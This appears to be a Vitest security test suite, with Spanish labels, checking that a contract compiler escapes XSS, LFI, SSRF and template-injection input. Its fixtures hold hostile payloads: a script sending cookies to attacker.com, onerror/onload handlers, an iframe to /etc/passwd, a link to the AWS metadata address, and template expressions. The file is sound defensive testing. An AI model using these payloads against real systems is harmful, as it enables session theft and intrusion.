import { describe, it, expect } from 'vitest';
import {
  compileToCanonicalMarkdown,
  compileToHumanMarkdown,
  compileToCanonicalPlainText,
  escapeHtml,
  sanitizeLegalText
} from '../../src/core/compiler/dual-compiler.js';
import { createValidTestContract } from './fixtures.js';

describe('AppSec Audit: Prevención de Inyección XSS y SSTI (Dual Compiler)', () => {
  describe('Unidades Sanitizadoras: escapeHtml & sanitizeLegalText', () => {
    it('debe neutralizar caracteres críticos de marcado HTML (<, >, &, ", \')', () => {
      const malicious = '<script>alert("XSS") & document.cookie</script>';
      const escaped = escapeHtml(malicious);

      expect(escaped).not.toContain('<script>');
      expect(escaped).not.toContain('</script>');
      expect(escaped).toBe('&lt;script&gt;alert(&quot;XSS&quot;) &amp; document.cookie&lt;/script&gt;');
    });

    it('debe filtrar caracteres de control ASCII no imprimibles en sanitizeLegalText', () => {
      const payloadWithNullBytes = 'Empresa\x00\x08Maliciosa\x1F S.A.<script>test</script>';
      const sanitized = sanitizeLegalText(payloadWithNullBytes);

      expect(sanitized).not.toContain('\x00');
      expect(sanitized).not.toContain('\x08');
      expect(sanitized).not.toContain('\x1F');
      expect(sanitized).toContain('EmpresaMaliciosa S.A.&lt;script&gt;test&lt;/script&gt;');
    });
  });

  describe('Inyección XSS en Razones Sociales (Partes Contractuales)', () => {
    it('debe neutralizar Stored XSS en el legalName del Creador', () => {
      const contract = createValidTestContract();
      contract.parties.creator.legalName = '<script>fetch("http://attacker.com/?c=" + document.cookie)</script>';

      const markdown = compileToCanonicalMarkdown(contract);
      const humanMd = compileToHumanMarkdown(contract);

      expect(markdown).not.toContain('<script>');
      expect(markdown).not.toContain('</script>');
      expect(markdown).toContain('&lt;script&gt;fetch(&quot;http://attacker.com/?c=&quot; + document.cookie)&lt;/script&gt;');

      expect(humanMd).not.toContain('<script>');
      expect(humanMd).toContain('&lt;script&gt;');
    });

    it('debe neutralizar payloads de imágenes con handlers de error (img onerror) en el legalName del Cliente', () => {
      const contract = createValidTestContract();
      contract.parties.client.legalName = 'MegaCorp <img src="x" onerror="alert(document.domain)" /> S.A.';

      const markdown = compileToCanonicalMarkdown(contract);
      const humanMd = compileToHumanMarkdown(contract);

      expect(markdown).not.toContain('<img');
      expect(markdown).not.toContain('<img src="x" onerror=');
      expect(markdown).toContain('MegaCorp &lt;img src=&quot;x&quot; onerror=&quot;alert(document.domain)&quot; /&gt; S.A.');

      expect(humanMd).not.toContain('<img');
      expect(humanMd).toContain('&lt;img');
    });

    it('debe neutralizar XSS vectorial SVG con ejecución onload en commercialName', () => {
      const contract = createValidTestContract();
      contract.parties.client.commercialName = 'EvilBrand <svg onload="window.location=\'http://phishing.lat\'">';

      const markdown = compileToCanonicalMarkdown(contract);
      expect(markdown).not.toContain('<svg');
      expect(markdown).not.toContain('<svg onload=');
      expect(markdown).toContain('&lt;svg onload=&quot;window.location=&#x27;http://phishing.lat&#x27;&quot;&gt;');
    });
  });

  describe('Prevención de LFI y SSRF contra Motores de Renderizado PDF', () => {
    it('debe neutralizar intentos de Local File Inclusion (LFI) vía <iframe> en descripciones', () => {
      const contract = createValidTestContract();
      contract.scope.description = 'Servicio estándar con carga: <iframe src="file:///etc/passwd"></iframe>';

      const markdown = compileToCanonicalMarkdown(contract);
      const plainText = compileToCanonicalPlainText(contract);

      expect(markdown).not.toContain('<iframe');
      expect(markdown).not.toContain('<iframe src="file:///etc/passwd"');
      expect(markdown).toContain('&lt;iframe src=&quot;file:///etc/passwd&quot;&gt;&lt;/iframe&gt;');

      // El compilador a texto plano debe desarmar la etiqueta
      expect(plainText).not.toContain('<iframe');
    });

    it('debe neutralizar SSRF a metadatos de Cloud (AWS Metadata 169.254.169.254) en entregables', () => {
      const contract = createValidTestContract();
      contract.payments.milestones[0].deliverables = [
        'Wireframes <link rel="stylesheet" href="http://169.254.169.254/latest/meta-data/">',
        'Guía de Estilos'
      ];

      const markdown = compileToCanonicalMarkdown(contract);
      expect(markdown).not.toContain('<link');
      expect(markdown).toContain('&lt;link rel=&quot;stylesheet&quot; href=&quot;http://169.254.169.254/latest/meta-data/&quot;&gt;');
    });
  });

  describe('Prevención de Server-Side Template Injection (SSTI) y Escape de Expresiones', () => {
    it('debe tratar expresiones de plantilla {{...}} y ${...} como texto literal inerte', () => {
      const contract = createValidTestContract();
      contract.scope.projectTitle = 'Desarrollo ${{7*7}} {{process.env.SECRET}} <%= system("ls") %>';

      const markdown = compileToCanonicalMarkdown(contract);
      expect(markdown).toContain('${{7*7}} {{process.env.SECRET}} &lt;%= system(&quot;ls&quot;) %&gt;');
      // No debe ser evaluado ni ejecutar código
      expect(markdown).not.toContain('49');
    });

    it('debe escapar correctamente caracteres ampersand y comillas en nombres comerciales legítimos', () => {
      const contract = createValidTestContract();
      contract.parties.creator.commercialName = 'García & Álvarez "Consultoría Creativa"';

      const markdown = compileToCanonicalMarkdown(contract);
      expect(markdown).toContain('García &amp; Álvarez &quot;Consultoría Creativa&quot;');
    });
  });
});
